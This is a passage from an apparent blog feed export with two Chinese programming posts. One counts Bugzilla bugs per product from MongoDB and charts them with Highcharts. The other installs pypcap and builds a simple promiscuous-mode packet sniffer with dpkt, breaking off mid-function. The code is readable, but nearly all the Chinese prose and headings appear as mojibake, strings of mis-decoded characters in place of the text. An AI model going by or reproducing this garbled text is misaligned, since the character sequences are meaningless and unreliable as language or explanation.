<h2 id="è¯»å–MongoDBæ•°æ®"><a href="#è¯»å–MongoDBæ•°æ®" class="headerlink" title="è¯»å–MongoDBæ•°æ®"></a>è¯»å–MongoDBæ•°æ®</h2><h3 id="è·å–æ‰€æœ‰äº§å“åç§°"><a href="#è·å–æ‰€æœ‰äº§å“åç§°" class="headerlink" title="è·å–æ‰€æœ‰äº§å“åç§°"></a>è·å–æ‰€æœ‰äº§å“åç§°</h3><p>é¦–å…ˆè·å–æ‰€æœ‰äº§å“åç§°ï¼Œå¯ä»¥é€šè¿‡<code>pymongo</code>åº“çš„findå‡½æ•°è·å–<code>metadata.Product</code>æ®µæ•°æ®ã€‚</p>
<pre><code class="python">from pymongo import MongoClient
import os

MONGOSERVER = &#39;localhost:27017&#39;
DATABASE = &#39;bugzilla&#39;
COLLECTION = &#39;bugs&#39;

class Analysis(object):
    def __init__(self):
        client = MongoClient(MONGOSERVER)
        db = client[DATABASE]
        self.col = db[COLLECTION]

    def getAllProductsName(self):
        records = self.col.find({}, {&#39;metadata.Product&#39;:1, &#39;_id&#39;:0})
        prdoucts = [ record[&#39;metadata&#39;][&#39;Product&#39;] for record in records ]
        prdoucts = list(set(prdoucts))
        prdoucts = sorted(prdoucts, key=lambda s: s.lower())
        return prdoucts
</code></pre>
<p><code>MongoClient</code>ç”¨æ¥æ‰“å¼€ä¸€ä¸ªclientå»è¿æ¥æ•°æ®åº“ï¼Œé€šè¿‡æŒ‡å®š<code>database</code>å’Œ<code>collection</code>å¯ä»¥å®šä½åˆ°æ•°æ®æºï¼Œå†ç”¨<code>find</code>å‡½æ•°æ£€ç´¢å‡ºäº§å“åç§°ä¿¡æ¯ã€‚ä»¥ä¸Šçš„<code>getAllProductsName</code>åé¢é€šè¿‡<code>set</code>é›†åˆçš„æ–¹å¼å»é‡ï¼Œæœ€åé€šè¿‡<code>sorted</code>è¿›è¡Œæ’åºï¼Œå³å¯è·å¾—æœ‰åºçš„äº§å“åç§°<code>products</code>ã€‚</p>
<h3 id="è·å–äº§å“bugæ•°"><a href="#è·å–äº§å“bugæ•°" class="headerlink" title="è·å–äº§å“bugæ•°"></a>è·å–äº§å“bugæ•°</h3><p>å½“ç„¶ï¼Œæˆ‘ä»¬æƒ³è¦çš„å…¶å®æ˜¯äº§å“bugæ•°é‡ï¼Œå¯¹äºå•ä¸ªäº§å“ï¼Œå¯ä»¥é€šè¿‡<code>pymongo</code>åº“çš„<code>count_documents</code>å‡½æ•°è·å¾—è¯¥æŒ‡å®šäº§å“bugæ•°ã€‚</p>
<pre><code class="py">    def countOneProduct(self, product):
        return self.col.count_documents({&#39;metadata.Product&#39;:product})  
</code></pre>
<p>æƒ³è¦è·å–æ‰€æœ‰çš„äº§å“bugæ•°ï¼Œç®€å•çš„æƒ³æ³•å½“ç„¶æ˜¯å¾ªç¯è°ƒç”¨<code>countOneProduct</code>å‡½æ•°ï¼Œä½†è¿™æ ·ä¼šéœ€è¦å¤§é‡çš„æ—¶é—´ï¼Œ9ä¸‡å¤šæ¡æ•°æ®é‡éœ€24så·¦å³çš„æ—¶é—´ã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆä¹…ï¼Œå› ä¸ºæ¯æ¬¡æ‰§è¡Œ<code>count_documents</code>éƒ½éœ€è¦é‡æ–°éå†ä¸€éæ•°æ®åº“ï¼Œè¿™æ˜¾ç„¶æ˜¯ä¸åˆé€‚çš„ã€‚æ›´å¥½çš„æ–¹æ³•æ˜¯åªéå†ä¸€éæ•°æ®åº“ï¼Œç„¶åå¯¹ä¸åŒäº§å“çš„bugæ•°è¿›è¡ŒåŒºåˆ†ç»Ÿè®¡ã€‚</p>
<pre><code class="py">    def countAllProducts(self):
        counts = {}
        records = self.col.find({}, {&#39;metadata.Product&#39;:1, &#39;_id&#39;:0})
        prdoucts = [ record[&#39;metadata&#39;][&#39;Product&#39;] for record in records ]
        for product in prdoucts:
            if product in counts:
                counts[product] += 1
            else:
                counts[product] = 1
        counts = sorted(counts.items(), key=lambda item: item[0].lower())
        return counts
</code></pre>
<p>ä»¥ä¸Šä»£ç æ®µé¦–å…ˆæ‰¾å‡ºæ•°æ®åº“æ¯æ¡è®°å½•çš„<code>metadata.Product</code>ä¿¡æ¯ï¼Œç„¶åå¾ªç¯åˆ¤åˆ«<code>product</code>åç§°ï¼Œå¯¹ä¸åŒäº§å“çš„å‡ºç°æ¬¡æ•°è¿›è¡Œè®¡æ•°ï¼Œç„¶åå­˜å…¥ç›¸åº”çš„å­—å…¸è®°å½•<code>counts[product]</code>ä¸­ï¼Œæ€»è€—æ—¶çº¦1sã€‚</p>
<h3 id="ä¿å­˜æ•°æ®è‡³jsonæ–‡ä»¶"><a href="#ä¿å­˜æ•°æ®è‡³jsonæ–‡ä»¶" class="headerlink" title="ä¿å­˜æ•°æ®è‡³jsonæ–‡ä»¶"></a>ä¿å­˜æ•°æ®è‡³jsonæ–‡ä»¶</h3><pre><code class="py">    def saveProductsIssues(self, path):
        counts = self.countAllProducts()
        with open(path, &#39;w&#39;, encoding=&#39;utf-8&#39;) as f:
            f.write(&#39;{\n&#39;)
            f.write(&#39;,\n&#39;.join([&#39;&quot;{}&quot;:{}&#39;.format(key, val) for key,val in counts]))
            f.write(&#39;\n}&#39;)
</code></pre>
<p>ä¿å­˜æ•°æ®æ—¶ï¼Œéœ€è¦ä½¿ç”¨<code>utf-8</code>æ ¼å¼ï¼Œå¦åˆ™å¯èƒ½å‡ºç°åç»­å¯è§†åŒ–æ—¶çš„ä¸­æ–‡ä¹±ç é—®é¢˜ã€‚</p>
<h2 id="Highchartsæ•°æ®å¯è§†åŒ–"><a href="#Highchartsæ•°æ®å¯è§†åŒ–" class="headerlink" title="Highchartsæ•°æ®å¯è§†åŒ–"></a>Highchartsæ•°æ®å¯è§†åŒ–</h2><p><a href="https://www.highcharts.com/" target="_blank" rel="noopener">Highcharts</a>æ˜¯ä¸€æ¬¾è¶…çº§æ£’çš„ç”¨äº<code>web</code>ç«¯æ•°æ®å¯è§†åŒ–çš„<code>js</code>åº“ï¼Œå›¾è¡¨æ ·å¼åŠå…¶ä¸°å¯Œï¼Œä½¿ç”¨ç®€å•ï¼Œå¼ºçƒˆæ¨èï¼ï¼ï¼</p>
<p>æˆ‘ä»¬è¦åšçš„å°±æ˜¯æŠŠ<code>highcharts</code>çš„jsåº“æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°ï¼Œç„¶åæ‹·è´ä¸€ä¸ªä¾‹ç¨‹ï¼Œæœ€åä¿®æ”¹ä¸€ä¸‹æ•°æ®æ¥æºå³å¯ï¼Œä¸‹é¢æ˜¯é’ˆå¯¹<code>bug</code>æ•°é€‰æ‹©çš„ä¸€ä¸ªå›¾è¡¨æ ·å¼å¯¹åº”çš„<code>html</code>æ–‡ä»¶</p>
<pre><code class="html">&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
        &lt;title&gt;Highcharts Example&lt;/title&gt;

        &lt;style type=&quot;text/css&quot;&gt;

        &lt;/style&gt;
    &lt;/head&gt;
&lt;body&gt;
&lt;!-- ä¸‹é¢æ˜¯éœ€è¦å¼•å…¥çš„åº“ï¼ŒåŒ…å«JQueryåŠhighchartsåº“ --&gt;
&lt;script src=&quot;https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;./code/highcharts.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;./code/modules/exporting.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;./code/modules/export-data.js&quot;&gt;&lt;/script&gt;

&lt;!-- æ ¹æ®æ•°æ®é‡å¤§å°ä¿®æ”¹ä¸‹æ–¹çš„æ˜¾ç¤ºèŒƒå›´ --&gt;
&lt;div id=&quot;container&quot; style=&quot;min-width: 310px; max-width: 800px; height: 600px; margin: 0 auto&quot;&gt;&lt;/div&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
// ä½¿ç”¨$.ajaxå¯¼å…¥æ•°æ®ï¼Œå¹¶é…ç½®Highchartså‚æ•°
$.ajax({
    url: &#39;products.json&#39;,
    dataType: &#39;json&#39;,
    contentType: &#39;application/json; charset=utf-8&#39;,
    success: function (src) {
        var categories = new Array();
        var data = new Array();
        for (item in src){
            categories.push(item)
            data.push(src[item])
        }

        Highcharts.chart(&#39;container&#39;, {
            chart: {
                type: &#39;bar&#39;
            },
            title: {
                text: &#39;All products issues number on bugzilla&#39;
            },
            subtitle: {
                text: &#39;Source: bugzilla&#39;
            },
            xAxis: {
                // æ›´æ”¹åˆ†ç±»
                categories: categories,
                title: {
                    text: null
                }
            },
            yAxis: {
                min: 0,
                title: {
                    text: &#39;Issues&#39;,
                    align: &#39;high&#39;
                },
                labels: {
                    overflow: &#39;justify&#39;
                }
            },
            tooltip: {
                valueSuffix: &#39;&#39;
            },
            plotOptions: {
                bar: {
                    dataLabels: {
                        enabled: true
                    }
                }
            },
            legend: {
                layout: &#39;vertical&#39;,
                align: &#39;right&#39;,
                verticalAlign: &#39;top&#39;,
                x: -40,
                y: 80,
                floating: true,
                borderWidth: 1,
                backgroundColor: ((Highcharts.theme &amp;&amp; Highcharts.theme.legendBackgroundColor) || &#39;#FFFFFF&#39;),
                shadow: true
            },
            credits: {
                enabled: false
            },
            series: [{
                name: &#39;Issues Number&#39;,
                // æ›´æ”¹æ•°æ®æ¥æº
                data: data
            }]
        });
    }
}
)
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>ä»¥ä¸Šæœ€ä¸»è¦çš„ä¸€æ®µä»£ç å¦‚ä¸‹ï¼Œé€šè¿‡JQueryçš„ajaxè¯»å–web serverä¸­çš„jsonæ–‡ä»¶ï¼ŒåŒæ—¶å°†jsonæ•°æ®çš„keyå’Œvalueåˆ†ç¦»è‡³<code>categories</code>å’Œ<code>data</code></p>
<pre><code class="js">$.ajax({
    url: &#39;products.json&#39;,
    dataType: &#39;json&#39;,
    contentType: &#39;application/json; charset=utf-8&#39;,
    success: function (src) {
        var categories = new Array();
        var data = new Array();
        for (item in src){
            categories.push(item)
            data.push(src[item])
        }
</code></pre>
<h3 id="å¯è§†åŒ–æ•ˆæœå±•ç¤º"><a href="#å¯è§†åŒ–æ•ˆæœå±•ç¤º" class="headerlink" title="å¯è§†åŒ–æ•ˆæœå±•ç¤º"></a>å¯è§†åŒ–æ•ˆæœå±•ç¤º</h3><p>ä¸ºäº†æ–¹ä¾¿å±•ç¤ºï¼Œæˆ‘ä»…ä»…æˆªå–äº†ä¸€æ®µæ•°æ®ï¼Œ<code>product</code>åç§°åšäº†éšæœºæ›¿æ¢å¤„ç†ï¼Œæ¯•ç«Ÿä¸»è¦è¿˜æ˜¯çœ‹å¯è§†åŒ–æ•ˆæœå˜›ã€‚</p>
<p><img src="/assets/highcharts/all-products-issues.svg" alt="Product bugs"></p>
<h2 id="éšæœºæ›¿æ¢å­—ç¬¦ä¸²"><a href="#éšæœºæ›¿æ¢å­—ç¬¦ä¸²" class="headerlink" title="éšæœºæ›¿æ¢å­—ç¬¦ä¸²"></a>éšæœºæ›¿æ¢å­—ç¬¦ä¸²</h2><p>ä¸Šé¢æåˆ°å¯¹<code>product</code>åç§°è¿›è¡Œéšæœºæ›¿æ¢å¤„ç†ï¼Œå…¶ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="py">import json
import secrets
import string
import numpy as np

with open(&#39;products.json&#39;,&#39;r&#39;,encoding=&#39;utf-8&#39;) as f:
    data = json.load(f)

new = {}
for key, val in data.items():
    N = np.random.randint(5,20)
    key = &#39;&#39;.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(N))
    new[key] = val

with open(&#39;products_new.json&#39;,&#39;w&#39;,encoding=&#39;utf-8&#39;) as f:
    json.dump(new, f, indent=4)
</code></pre>
<p>è¯¥æ›¿æ¢æ–¹æ³•å‚è€ƒä»¥ä¸‹æ–‡ç« :</p>
<ul>
<li><a href="https://codeday.me/bug/20180821/225180.html" target="_blank" rel="noopener">åœ¨Python 3ä¸­ç”Ÿæˆéšæœºé•¿åº¦çš„éšæœºç±»å­—ç¬¦ä¸²çš„æœ€å¿«æ–¹æ³•</a></li>
</ul>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡ä»‹ç»äº†å¦‚ä½•æ£€ç´¢<code>MongoDB</code>ä¸­çš„æ•°æ®ï¼Œå¦‚ä½•å°†æ•°æ®å­˜å…¥jsonæ–‡ä»¶ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨<code>highcharts</code>å®ç°æ•°æ®å¯è§†åŒ–ï¼Œæœ€åç»™å‡ºäº†éšæœºæ›¿æ¢å­—ç¬¦ä¸²çš„ä¸€ç§å®ç°æ–¹æ³•ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> visualization </tag>
            
            <tag> MongoDB </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonä¹‹pypcapåº“çš„å®‰è£…åŠç®€å•æŠ“åŒ…å·¥å…·çš„å®ç°]]></title>
      <url>https://www.litreily.top/2018/12/31/pypcap-install/</url>
      <content type="html"><![CDATA[<p><a href="https://github.com/pynetwork/pypcap" target="_blank" rel="noopener">pypcap</a>æ˜¯ä¸€ä¸ªå¯¹<code>libpcap</code>Cåº“è¿›è¡Œå°è£…å’Œç®€åŒ–çš„é¢å‘å¯¹è±¡çš„æŠ“åŒ…å·¥å…·åº“ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿çš„ç”¨äºæŠ“åŒ…å’Œè¿‡æ»¤ï¼Œç»“åˆ<code>dpkt</code>è§£æåº“å¯ä»¥å®Œæˆè®¸å¤šç½‘ç»œæ•°æ®åŒ…çš„æŠ“å–å’Œåˆ†æã€‚æœ¬æ–‡è®²è¿°çš„å°±æ˜¯å¦‚ä½•ä½¿ç”¨<code>pypcap</code>åŠ<code>dpkt</code>åº“å®ç°ç®€å•æŠ“åŒ…å·¥å…·ï¼Œä¹Ÿç§°ä¸ºå—…æ¢å™¨(sniffer).</p>
<h2 id="Linux-ç«¯å®‰è£…-pypcap"><a href="#Linux-ç«¯å®‰è£…-pypcap" class="headerlink" title="Linux ç«¯å®‰è£… pypcap"></a>Linux ç«¯å®‰è£… pypcap</h2><pre><code class="bash">sudo apt-get install libpcap-dev
sudo pip install pypcap
</code></pre>
<p>è¿™é‡Œæœ‰ä¸ªé—®é¢˜,å¦‚æœä½¿ç”¨<code>Anaconda</code>ç›®å½•çš„<code>pip</code>å®‰è£…åˆ™å¯èƒ½å¤±è´¥,ç›®å‰åŸå› æœªæ˜,ä½†å®˜æ–¹çš„<code>python3</code>å¯¹åº”çš„<code>pip3</code>åŠ<code>python2</code>å¯¹åº”çš„<code>pip</code>å‡æ— æ­¤é—®é¢˜.</p>
<a id="more"></a>
<h2 id="Windows-ç«¯å®‰è£…-pypcap"><a href="#Windows-ç«¯å®‰è£…-pypcap" class="headerlink" title="Windows ç«¯å®‰è£… pypcap"></a>Windows ç«¯å®‰è£… pypcap</h2><p>æ ¹æ®<code>pypcap</code>å®˜æ–¹è¯´æ˜ï¼š</p>
<blockquote>
<p>WinPcap has compatibility issues with Windows 10, therefore it&#39;s recommended to use Npcap (Nmap&#39;s packet sniffing library for Windows, based on the WinPcap/Libpcap libraries, but with improved speed, portability, security, and efficiency). Please enable WinPcap API-compatible mode during the library installation.</p>
</blockquote>
<p>è¿™é‡Œæåˆ°<code>winpcap</code>ä¸<code>win10</code>é—´å­˜åœ¨å…¼å®¹æ€§é—®é¢˜ï¼Œå…·ä½“ä»€ä¹ˆé—®é¢˜æˆ‘ä¹Ÿæ²¡ææ¸…æ¥šï¼Œä¹‹å‰ä½¿ç”¨<code>wireshark</code>æŠ“åŒ…ä¸€ç›´ç”¨çš„<code>winpcap</code>ä¹Ÿæ²¡é—®é¢˜ã€‚ä¸è¿‡æˆ‘ä¼°è®¡å’Œåé¢è¦ç”¨åˆ°çš„<code>npcap sdk</code>æœ‰å…³å§ã€‚æ—¢å¦‚æ­¤ï¼Œå°±éœ€è¦åœ¨å®‰è£…<code>pypcap</code>å‰å®‰è£…å¥½<code>Npcap</code>ï¼Œå¹¶ä¸‹è½½å¥½<code>Npcap SDK</code>ã€‚</p>
<h3 id="ä¸‹è½½æ–‡ä»¶"><a href="#ä¸‹è½½æ–‡ä»¶" class="headerlink" title="ä¸‹è½½æ–‡ä»¶"></a>ä¸‹è½½æ–‡ä»¶</h3><ol>
<li><a href="https://github.com/pynetwork/pypcap/releases" target="_blank" rel="noopener">pypcap æºç </a></li>
<li><a href="https://nmap.org/npcap/#download" target="_blank" rel="noopener">Npcap</a></li>
<li><a href="https://nmap.org/npcap/#download" target="_blank" rel="noopener">Npcap SDK</a></li>
</ol>
<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><ul>
<li>å®‰è£…Npcap</li>
</ul>
<p>å®‰è£…ä¸‹è½½åçš„Npcapå®‰è£…åŒ…ï¼Œå¦‚æœç”µè„‘å¸¦æœ‰æ— çº¿ç½‘å¡ï¼Œè®°å¾—å‹¾é€‰â€œsupport raw 802.11 traffic(and monitor mode) for wireless adaptersâ€ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœç”µè„‘å·²ç»å®‰è£…è¿‡<code>winpcap</code>è½¯ä»¶ï¼Œåœ¨å®‰è£…<code>Npcap</code>æ—¶ä¼šå¼¹çª—æç¤ºå¸è½½<code>Winpcap</code>,æ­¤æ—¶éœ€è¦å…³é—­wiresharkæˆ–æ˜¯å…¶å®ƒç›¸å…³çš„è½¯ä»¶</p>
<ul>
<li>å®‰è£…pypcap</li>
</ul>
<ol>
<li>å°†<code>Npcap SDK</code>æ–‡ä»¶å¤¹å’Œ<code>pypcap</code>æºç æ–‡ä»¶å¤¹æ”¾åœ¨ä¸€ä¸ªç›®å½•ä¸‹</li>
<li>å°†<code>Npcap SDK</code>æ–‡ä»¶å¤¹åç§°ä¿®æ”¹ä¸º<code>wpdpack</code></li>
<li>è¿›å…¥<code>pypcap</code>æºç ç›®å½•ï¼Œæ‰§è¡Œ<code>python setup.py install</code>å³å¯å®Œæˆå®‰è£…</li>
</ol>
<p>åœ¨ç¬¬ä¸‰æ­¥éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœPythonç‰ˆæœ¬ä¸º3.7.2ï¼ˆå…¶å®ƒå¤§äº3.7çš„ç‰ˆæœ¬æ²¡è¯•è¿‡ï¼‰æœ‰å¯èƒ½ç¼–è¯‘å¤±è´¥ï¼Œå› ä¸ºæœ‰ä¸ªå¤´æ–‡ä»¶<code>pystate.h</code>åœ¨é«˜ç‰ˆæœ¬ä¼šæœ‰æ›´æ–°ï¼Œå¯¼è‡´ç»“æ„ä½“<code>_ts PyThreadState</code>ä¸­çš„æŸäº›å‚æ•°ä¸è¯†åˆ«ï¼Œä»è€Œæç¤ºé”™è¯¯<code>pcap.c(22849): error C2039: &#39;exc_value&#39;: is not a member of &#39;_ts&#39;</code>ç­‰ã€‚ä¹‹åæˆ‘å°†ç‰ˆæœ¬æ¢è‡³3.6.6åä¾¿æ­£å¸¸ç¼–è¯‘äº†ã€‚</p>
<p>å®‰è£…å®Œæˆåï¼Œå¯ä»¥è¿›å…¥<code>python</code>æ‰§è¡Œ<code>import pcap</code>æŸ¥çœ‹æ˜¯å¦å·²ç»å¯ä»¥æ­£å¸¸å¯¼å…¥ã€‚</p>
<h2 id="ç®€å•ä½¿ç”¨"><a href="#ç®€å•ä½¿ç”¨" class="headerlink" title="ç®€å•ä½¿ç”¨"></a>ç®€å•ä½¿ç”¨</h2><pre><code class="python">import pcap

# list all of the Internet devices
devs = pcap.findalldevs()
print(*devs, sep=&#39;\n&#39;)

pc = pcap.pcap(devs[3], promisc=True, immediate=True, timeout_ms=50)
# fiter http pcakets
pc.setfilter(&#39;tcp port 80&#39;)
for ptime, pdata in pc:
    print(ptime, pdata)
</code></pre>
<p>æ¥ä¸‹æ¥ç®€å•è§£é‡Šä¸‹å‡ ä¸ªä¸»è¦å‡½æ•°</p>
<h3 id="findalldevs"><a href="#findalldevs" class="headerlink" title="findalldevs"></a>findalldevs</h3><p><code>findalldevs</code>å¯ä»¥åˆ—å‡ºå½“å‰æ“ä½œç³»ç»Ÿçš„æ‰€æœ‰ç½‘ç»œæ¥å£,ä½†æ˜¯<code>windows</code>å’Œ<code>Linux</code>çš„è¾“å‡ºé£æ ¼ä¸å¤§ä¸€æ ·,ä¸‹é¢æ¥çœ‹çœ‹.</p>
<p>Linuxç‰ˆè¾“å‡ºç®€å•æ˜äº†,è‹¥æˆ‘çŒœçš„ä¸é”™,è¾“å‡ºçš„é¦–ä¸ªæ¥å£ä¾¿æ˜¯ç”µè„‘çš„æœ‰çº¿æ¥å£(æœ¬äººå°å¼æœº,Ubuntuç³»ç»Ÿ),è‡³å°‘åœ¨æˆ‘è¿™æ˜¯é€‚ç”¨çš„.</p>
<pre><code class="zsh">âœ python
Python 3.6.7 (default, Oct 22 2018, 11:32:17)
[GCC 8.2.0] on linux
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&gt;&gt;&gt; import pcap
&gt;&gt;&gt; pcap.findalldevs()
[&#39;enp2s0&#39;, &#39;any&#39;, &#39;lo&#39;, &#39;nflog&#39;, &#39;nfqueue&#39;, &#39;usbmon1&#39;, &#39;usbmon2&#39;]
&gt;&gt;&gt;
</code></pre>
<p>åœ¨<code>ubuntu</code>åŠå¤§éƒ¨åˆ†Linuxç³»ç»Ÿä¸­,å‡å¯ä½¿ç”¨<code>ip route</code>æˆ–æ˜¯<code>ifconfig</code>æ¥è·å–æ¥å£åï¼Œæ®æ­¤ç”šè‡³å¯ä»¥è‡ªåŠ¨è·å–æ¥å£åï¼</p>
<p>Windowsç‰ˆåˆ™æ¯”è¾ƒå¤æ‚ï¼Œä¸‹é¢æ˜¯æŸå°ç”µè„‘<code>win10</code>æ“ä½œç³»ç»Ÿè¾“å‡ºçš„ç»“æœï¼Œè¿™ä¸ªç›´æ¥çœ‹æ˜¯çœ‹ä¸å‡ºä»€ä¹ˆçš„, å› ä¸ºä½¿ç”¨<code>cmd</code>æŒ‡ä»¤<code>ipconfig /all</code>è¾“å‡ºçš„æ¥å£ä¿¡æ¯å¹¶ä¸åŒ…å«ä»¥ä¸‹å†…å®¹ï¼Œè€Œæ˜¯æ¥å£åç§°åŠæè¿°ä¿¡æ¯ç­‰ï¼Œå¦‚æœæƒ³çŸ¥é“ä¸‹é¢æ¥å£å¦‚ä½•ä¸æ¥å£åå¯¹åº”èµ·æ¥ï¼Œå¯ä»¥å‚è€ƒåé¢æŠ“åŒ…å·¥å…·ä½¿ç”¨æ³¨å†Œè¡¨æ¥è·å–æ¥å£ä¿¡æ¯,æˆ–æ˜¯æ‰“å¼€<code>wireshark</code>æŠ“åŒ…ï¼Œæ¯ä¸ªæŠ¥æ–‡çš„å¸§å¤´éƒ½ä¼šæ˜¾ç¤ºå½“å‰æ¥å£çš„æ¥å£ä¿¡æ¯ï¼</p>
<pre><code class="zsh">&gt;&gt;&gt; import pcap
&gt;&gt;&gt; pcap.findalldevs()
[&#39;\Device\NPF_{839768E4-726A-48BB-9CEC-BD6FD670CB8F}&#39;, &#39;\Device\NPF_{C4D1AF17-C5C9-40C5-90F8-17781657FC9E}&#39;, &#39;\Device\NPF_{26024876-9711-428F-89D3-B91D2C488AC5}&#39;, &#39;\Device\NPF_{E26BFFEF-0644-4C13-8016-EB408AE1D471}&#39;, &#39;\Device\NPF_{9ED3674C-211E-4A57-923A-F8DBE6E6B704}&#39;, &#39;\Device\NPF_{A0B8B562-F309-44F3-95A1-BF34F5465925}&#39;, &#39;\Device\NPF_{9D76B006-6946-4C88-AED2-7F7A9194303C}&#39;]
</code></pre>
<h3 id="pcap-pcap"><a href="#pcap-pcap" class="headerlink" title="pcap.pcap"></a>pcap.pcap</h3><pre><code class="py">pc = pcap.pcap(devs[3], promisc=True, immediate=True, timeout_ms=50)
</code></pre>
<p>ä»¥ä¸Šä»£ç å®šä¹‰äº†ä¸€ä¸ªpcapå¯¹è±¡ï¼Œé¦–ä¸ªå‚æ•°<code>devs[3]</code>å¯¹åº”æ¥å£åï¼Œ<code>promisc</code>ä¸ºçœŸä»£è¡¨æ‰“å¼€æ··æ‚æ¨¡å¼ï¼Œ<code>immediate</code>ä»£è¡¨ç«‹å³æ¨¡å¼ï¼Œå¯ç”¨å°†ä¸ç¼“å­˜æ•°æ®åŒ…,<code>timeout_ms</code>ä»£è¡¨æ¥æ”¶æ•°æ®åŒ…çš„è¶…æ—¶æ—¶é—´</p>
<h3 id="setfilter"><a href="#setfilter" class="headerlink" title="setfilter"></a>setfilter</h3><p><code>setfilter</code>ç”¨æ¥è®¾ç½®æ•°æ®åŒ…è¿‡æ»¤å™¨ï¼Œæ¯”å¦‚åªæƒ³æŠ“<code>http</code>çš„åŒ…ï¼Œé‚£å°±é€šè¿‡<code>setfilter(tcp port 80)</code>å®ç°ï¼Œæ›´åŠ è¯¦ç»†çš„è¿‡æ»¤è§„åˆ™è¯·è‡ªè¡Œè°·æ­Œï¼</p>
<h3 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h3><pre><code class="py">for ptime, pdata in pc:
    print(ptime, pdata)
</code></pre>
<p><code>pcap.pcap</code>å¯¹è±¡pcæ˜¯ä¸ªåŠ¨æ€æ•°æ®ï¼Œé€šå¸¸ç»“åˆforå¾ªç¯æˆ–æ˜¯whileå¾ªç¯ä¸æ–­è¯»å–æ•°æ®åŒ…ï¼Œæ•°æ®åŒ…ä¼šè¿”å›æ—¶é—´æˆ³åŠæŠ¥æ–‡æ•°æ®ï¼</p>
<p>ä¸Šé¢è¿™ä¸ªå°ä¾‹å­å°±æ˜¯ç®€å•çš„è¯´æ˜<code>pcap</code>å¸¸ç”¨åº“å‡½æ•°çš„ä½¿ç”¨æ–¹æ³•ï¼å…·ä½“çš„æ•°æ®åŒ…çš„å­˜å‚¨åŠè§£æéœ€è¦ç”±è§£æåº“<code>dpkt</code>æ¥å®Œæˆï¼ä¸‹é¢æ˜¯ä¸€ä¸ªæ›´åŠ è¯¦ç»†çš„æŠ“åŒ…å·¥å…·å®ä¾‹ï¼Œå¯ä»¥å®Œæˆæ•°æ®åŒ…çš„æŠ“å–ã€è§£æåŠå­˜å‚¨.</p>
<h2 id="ç®€æ˜“æŠ“åŒ…å·¥å…·"><a href="#ç®€æ˜“æŠ“åŒ…å·¥å…·" class="headerlink" title="ç®€æ˜“æŠ“åŒ…å·¥å…·"></a>ç®€æ˜“æŠ“åŒ…å·¥å…·</h2><pre><code class="python">#!/usr/bin/env python3
# -*- encoding:utf-8 -*-
import pcap
import dpkt

import getopt
import sys
import datetime
import time
import os
import platform

if &#39;Windows&#39; in platform.platform():
    import winreg as wr


IF_REG = r&#39;SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}&#39;
def getInterfaceByName(name):
    &#39;&#39;&#39;Get guid of interface from regedit of windows system

    Args:
        name: interface name

    Returns:
        An valid guid value or None.

    Example:
        getInterfaceByName(&#39;eth0&#39;)
    &#39;&#39;&#39;
    reg = wr.ConnectRegistry(None, wr.HKEY_LOCAL_MACHINE)
    reg_key = wr.OpenKey(reg, IF_REG)
    for i in range(wr.QueryInfoKey(reg_key)[0]):
        subkey_name = wr.EnumKey(reg_key, i)
        try:
            reg_subkey = wr.OpenKey(reg_key, subkey_name + r&#39;\Connection&#39;)
            Name = wr.QueryValueEx(reg_subkey, &#39;Name&#39;)[0]
            wr.CloseKey(reg_subkey)
            if Name == name:
                return r&#39;\Device\NPF_&#39; + subkey_name
        except FileNotFoundError as e:
            pass

    return None

def mac_addr(mac):
    return &#39;%02x:%02x:%02x:%02x:%02x:%02x&#39;%tuple(mac)

def ip_addr(ip):
    return &#39;%d.%d.%d.%d&#39;%tuple(ip)

def captureData(iface):
    pkt = pcap.pcap(iface, promisc=True, immediate=True, timeout_ms=50)
    # filter method
    filters = {
        &#39;DNS&#39;: &#39;udp port 53&#39;,
        &#39;HTTP&#39;: &#39;tcp port 80&#39;
    }
    # pkt.setfilter(filters[&#39;HTTP&#39;])

    pcap_filepath = &#39;pkts/pkts_{}.pcap&#39;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,
        time.localtime()))
    pcap_file = open(pcap_filepath, &#39;wb&#39;)
    writer = dpkt.pcap.Writer(pcap_file)
    print(&#39;Start capture...&#39;)
    try:
        pkts_count = 0
        for ptime, pdata in pkt:
            writer.writepkt(pdata, ptime)
            # anlysisData(pdata)
            printRawPkt(ptime, pdata)
            pkts_count += 1
    except KeyboardInterrupt as e:
        writer.close()
        pcap_file.close()
        if not pkts_count:
            os.remove(pcap_filepath)
        print(&#39;%d packets received&#39;%(pkts_count))

def printRawPkt(time, data):
    eth = dpkt.ethernet.Ethernet(data)
    print(&#39;Timestamp: &#39;, str(datetime.datetime.utcfromtimestamp(time)))
    print(&#39;Ethernet Frame: &#39;, mac_addr(eth.src), mac_addr(eth.dst))
    if not isinstance(eth.data, dpkt.ip.IP):
        print(&#39;&#39;)
        return

    ip = eth.data

    # get fragments info
